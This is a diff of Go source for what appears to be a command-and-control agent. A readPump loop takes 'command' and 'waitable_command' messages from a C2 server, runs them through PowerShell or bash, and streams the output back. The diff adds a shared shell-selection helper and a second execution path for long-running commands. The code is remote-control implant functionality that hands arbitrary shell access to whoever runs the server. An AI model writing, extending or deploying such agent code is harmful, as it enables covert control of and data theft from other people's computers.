@@ -25,8 +25,6 @@ func init() {
 		addr = flag.String("addr", "localhost:8081", "http service address")
 
 	}
-
-	//addr = flag.String("addr", "192.168.50.19:8081", "http service address")
 }
 
 var (
@@ -81,13 +79,33 @@ func connectToC2Router() {
 //}
 //
 
+func getCmdShell(cmd *exec.Cmd, command string) *exec.Cmd {
+	switch os := runtime.GOOS; os {
+	case "windows":
+		cmd = exec.Command("powershell", "-NoProfile", command)
+	case "linux":
+		cmd = exec.Command("bash", "-c", command)
+	default:
+		cmd = exec.Command("bash", "-c", command)
+	}
+	return cmd
+}
 func executeCommand(command string, c *Client) {
 	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("powershell", "-NoProfile", command) // '-b' option for non-interactive mode
-	} else if runtime.GOOS == "linux" {
-		cmd = exec.Command("bash", "-c", command) // '-b' option for non-interactive mode
+	cmd = getCmdShell(cmd, command)
+
+	commandOutput, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Println("Error running command: %v", err)
 	}
+	transferPacket := encodeTransferPacket("command_output", string(commandOutput))
+	c.send <- transferPacket
+}
+
+func executeWaitableCommand(command string, c *Client) {
+	var cmd *exec.Cmd
+	cmd = getCmdShell(cmd, command)
+
 	cmdReader, err := cmd.StdoutPipe()
 	if err != nil {
 		log.Fatalf("Error creating StdoutPipe for Cmd: %v", err)
@@ -163,9 +181,13 @@ func (c *Client) readPump() {
 			log.Println("unmarshal transferPacket command:", err)
 		}
 
-		if transferPacket.Header == "command" {
+		switch transferPacket.Header {
+		case "command":
 			command := transferPacket.Payload
 			executeCommand(command, c)
+		case "waitable_command":
+			command := transferPacket.Payload
+			executeWaitableCommand(command, c)
 		}
 
 	}
